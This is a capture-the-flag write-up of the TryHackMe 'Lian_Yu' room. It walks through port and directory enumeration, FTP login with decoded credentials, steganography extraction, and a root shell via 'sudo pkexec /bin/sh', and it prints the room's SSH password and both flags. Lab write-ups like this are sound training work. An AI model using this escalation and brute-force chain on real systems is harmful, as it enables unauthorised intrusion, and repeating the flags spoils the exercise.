# 🛡️ TryHackMe – Lian_Yu - Writeup

## 📌 Overview
**Room Name:** Lian_Yu  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web / Steganography / FTP / PrivEsc

Arrow-themed Linux machine. Web enumeration uncovers a hidden directory and a Base58-encoded FTP password, FTP yields images with steganographic content, and sudo `pkexec` provides root.

Attack chain overview:

- Port scanning revealing FTP, SSH, and HTTP
- Recursive web directory brute-force → `/island/2100` → `green_arrow.ticket` → Base58-decoded FTP credentials
- FTP login → corrupted PNG with repaired magic bytes revealing a passphrase; JPEG with hidden ZIP via stegseek
- ZIP extraction → SSH password for user `slade`
- sudo `pkexec /bin/sh` → root

---

## 🔍 1. Enumeration

### 🔎 Port Scan

```bash
rustscan -a <TARGET_IP> -r 1-65535 -- -sV -sC
```

```text
21/tcp    open  ftp      vsftpd 3.0.2
22/tcp    open  ssh      OpenSSH 6.7p1
80/tcp    open  http     Apache httpd
111/tcp   open  rpcbind
33840/tcp open  status   RPC #100024
```

FTP and HTTP were the immediate targets. rpcbind prompted a check for exposed NFS mounts:

```bash
showmount -e <TARGET_IP>
# → clnt_create: RPC: Program not registered
```

NFS was not in use — rpcbind was running but no NFS service was registered behind it.

### 🌐 Web Enumeration

The main page at port 80 was Arrow-themed with no obvious functionality. Initial directory brute-forcing with `gobuster` and a small wordlist (`common.txt`, ~4,600 entries) returned nothing.

> **Why the switch:** `common.txt` is too small for CTF-specific path names. Switched to `feroxbuster` with `DirBuster-2.3-medium.txt` (~220,000 entries) and recursive scanning enabled — tools like `gobuster` require manual re-runs per discovered directory, whereas `feroxbuster` recurses automatically.

```bash
feroxbuster -u http://<TARGET_IP> \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

Discovered: `/island` → recursive scan found `/island/2100`

The page source of `/island/2100` contained a hidden username. A hint in the HTML (`<b>arrow</b>`) suggested a `.ticket` extension, leading to a targeted extension scan:

```bash
feroxbuster -u http://<TARGET_IP>/island/2100 \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x ticket
```

Discovered: `green_arrow.ticket`

The file contained a Base58-encoded string. Decoded via CyberChef (`From Base58`), yielding the FTP password.

---

## 🔓 2. FTP Access

Anonymous login was rejected outright (`530 Permission denied`) — the server had anonymous access explicitly disabled. Logged in with the discovered credentials:

```bash
ftp <TARGET_IP>
# Username: vigilante (found in /island/2100 page source)
# Password: <Base58-decoded value>
```

Three files were retrieved:

```text
Leave_me_alone.png
Queen's_Gambit.png
aa.jpg
```

---

## 🔬 3. Steganography

### 🖼️ Leave_me_alone.png — Corrupted Magic Bytes

```bash
file Leave_me_alone.png
# → data
```

A valid PNG would return `PNG image data`. The `data` result indicated the file header was corrupted or deliberately modified.

```bash
xxd Leave_me_alone.png | head -1
# → 5845 6fae 0a0d 1a0a ...
```

A valid PNG magic bytes sequence is `89 50 4E 47 0D 0A 1A 0A`. The first four bytes had been overwritten. Repaired with:

```bash
printf '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a' | dd of=Leave_me_alone.png bs=1 seek=0 conv=notrunc

file Leave_me_alone.png
# → PNG image data ✅
```

Opening the repaired image revealed the passphrase: **`password`**

### 🖼️ aa.jpg — Hidden ZIP via stegseek

```bash
stegseek aa.jpg
# → Found passphrase: "password"
# → Original filename: "ss.zip"
# → Extracting to "aa.jpg.out"
```

```bash
cp aa.jpg.out ss.zip
unzip ss.zip
```

Contents:
- `passwd.txt` — in-universe Arrow flavour text, no useful data
- `shado` — contains: `M3tahuman`

The filename references the Arrow character Shado. The content is the SSH password.

---

## 👑 4. Initial Access & Privilege Escalation

### 🔑 SSH Login

The username `slade` was visible as a directory in FTP (`slade/` alongside `vigilante/`):

```bash
ssh slade@<TARGET_IP>
# Password: M3tahuman
```

**Initial access as `slade` achieved.** ✅

```bash
cat ~/user.txt
```

### ⚡ sudo pkexec → root

```bash
sudo -l
# → (root) PASSWD: /usr/bin/pkexec
```

`pkexec` (Polkit) is listed on GTFOBins as a direct shell escalation vector when sudoable:

```bash
sudo pkexec /bin/sh
whoami
# → root
```

**ROOT ACCESS GRANTED.** ✅

---

## 🏁 Flags

### 🧍 User Flag

```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

### 👑 Root Flag

```
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```

---

## 📚 Key Takeaways

- 📋 **Wordlist size directly determines discovery success:** `common.txt` (~4,600 entries) missed `/island` entirely. A medium-sized wordlist from SecLists found it immediately. Calibrate the wordlist to the target's complexity.

- 🔁 **Use recursive scanners for multi-depth paths:** `/island/2100` required a second pass. `feroxbuster` handles recursion automatically, while `gobuster` would have needed a manual follow-up scan.

- 🖼️ **`file` returning `data` means a corrupted or spoofed header:** Legitimate images return their format name. A `data` result is a strong signal to inspect the magic bytes with `xxd` and compare against the expected signature.

- 🔬 **zsteg false positives are common:** Running `zsteg` on `Lianyu.png` detected apparent OpenPGP keys and zlib data — all were misidentified. Attempting `gpg --import` (`no valid OpenPGP data found`) and `zlib.decompress` (`invalid block type`) confirmed these were noise. Always validate zsteg detections before investing further effort.

- 🔑 **FTP directory listings expose usernames:** Even without being able to read another user's files, seeing `slade/` in the FTP listing provided the SSH username. Enumeration data compounds across phases.

---

## 🛠️ Tools Used

- `rustscan`
- `feroxbuster`
- `ftp`
- `xxd`, `dd`, `printf` (PNG header repair)
- `stegseek`
- `zsteg` (false positive investigation)
- `unzip`
- `ssh`
- GTFOBins (`pkexec`)
- CyberChef (Base58 decode)

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
